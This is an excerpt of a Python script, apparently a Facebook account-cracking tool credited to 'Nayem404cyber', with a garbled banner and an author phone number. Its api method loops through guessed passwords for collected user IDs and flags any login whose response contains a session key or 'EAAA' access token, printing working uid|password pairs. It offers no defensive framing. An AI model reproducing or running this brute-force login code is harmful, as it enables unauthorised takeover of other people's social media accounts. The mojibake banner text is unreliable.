...
\033[1;93m |  ╚═╝░░░╚═╝░░░╚══════╝
    ...
    鈹� [鉁揮 AUTHOR   : NAYEM            鈹�
    鈹� [鉁揮 GITHUB   : Nayem404cyber         鈹�
    鈹� [鉁揮 WHATSAPP : 01706167094        鈹�
    鈹� [鉁揮 POWER BY : \x1b[1;32mNAYEM\x1b[1;97m            鈹�
    鈹斺攢鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹榎033[1;92m""")
		...
		print("\033[92;1m        AUTHOR : Nayem404cyber      ")
		print("\033[97;1m   鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€")
		...
		if hoga in ["", " "]:
			...
			os.system('am start https://www.facebook.com/profile.php?id=Nayemvai07')
		else:
			Main()
	...
	def email(self):
		x = 111
		xx = 999
		nam = input("%s [?] TYPE A NAME %s(EX:Tahiya ", " Nayem): "%(Y,G))
		nam = nam.replace(" ", "")
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s\033[0;93m[NAYEM馃う鈥嶁檪锔廬 : \033[0;97m %s/%s -> \033[0;92m [OK馃槏:%s ]- \033[0;93m[CP馃樋:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[Itz-OK馃槏] %s|%s\033[0;97m         "%(uid, pw))
